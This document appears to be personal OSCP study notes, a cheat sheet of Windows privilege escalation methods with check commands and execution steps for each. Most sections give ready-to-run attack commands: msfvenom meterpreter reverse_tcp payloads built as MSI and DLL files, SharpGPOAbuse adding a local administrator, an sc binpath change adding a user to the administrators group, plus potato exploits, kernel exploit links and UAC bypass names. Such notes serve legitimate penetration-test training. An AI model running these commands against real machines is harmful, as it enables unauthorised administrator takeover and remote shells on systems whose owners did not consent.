# Windows Privilege Escalation Methods

Below are some of the more common methods of privilege escalation that I have come across during the course of my OSCP journey.

-----


### SeImpersonatePrivilege
- Allows for token impersonation. Can be abused to escalate privileges when this policy is enabled. 

#### Check:
``` 
whoami /priv
```

#### Payload / Execution:
 - Multiple exploits:
    - Juicy Potatoe / Lovely Potatoe
    - PrintSpoofer.exe
 

---

### Unquoted Service Path
 - When a service name is not within quotations, Windows will check each "stop" along the path where the spaces occur.

#### Check:
 
 - powerup:
```
Invoke-AllChecks
```
 - If service names known:
```
sc qc servicename

```

#### Payload / Execution:
Service at:
```
C:\Program Files\New Service\service.exe
``` 

```
powerup:
Write-ServiceBinary -ServiceName 'New Service' -Path <HijackPath>

OR manually place payload at:
C:\Program.exe
OR
C:\Program Files\new.exe
```
Then, restart the service to execute the payload:
```
sc restart "New Service"
```

---
### AlwaysInstallElevatated - Registry Escalation Exploitation

#### Check:
``` 
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
 
```
#### Payload/Execution:
``` 
msfvenom -p windows/meterpreter/reverse_tcp lhost=tun0 -f msi -o exp.msi
```

---

### GPO Abuse

#### Check:
``` 
powerview:
Get-NetGPO
```

#### Payload / Execution:
``` 
./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount Administrator --GPOName "Default Domain Policy"
```

---

### DLL Hijacking

#### Check:
``` 
powerup:
Invoke-AllChecks
```


#### Payload / Execution:
``` 
With powerup:
Write-HijackDll -DllPath 'C:\Program Files\program\func.dll

Manually:
msfvenom -p windows/meterpreter/reverse_tcp -ax86 -f dll LHOST=tun0 LPORT=443 > exp.dll

msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f dll LHOST=tun0 LPORT=443 > exp.dll
```
----

### binPath

#### Check:
``` 
accesschk64.exe -wuvc daclsvc
```
Confirmation:
    -  “SERVICE_CHANGE_CONFIG”


#### Payload / Execution:
``` 
sc config daclsvc binpath= "net localgroup administrators user /add
sc start daclsvc
```

---

### Kernel Exploits:
https://github.com/Ascotbe/Kernelhub/tree/master/Windows

https://github.com/SecWiki/windows-kernel-exploits

---
### Other Methods:
 - UAC Bypass
   - fodhelper
   - accesschk
   - psexec with -accepteula (from Administrator to nt authority/service)
   - taihou
 - Registry - Other methods like AutoRun
 - Password Mining - Configuration / Memory

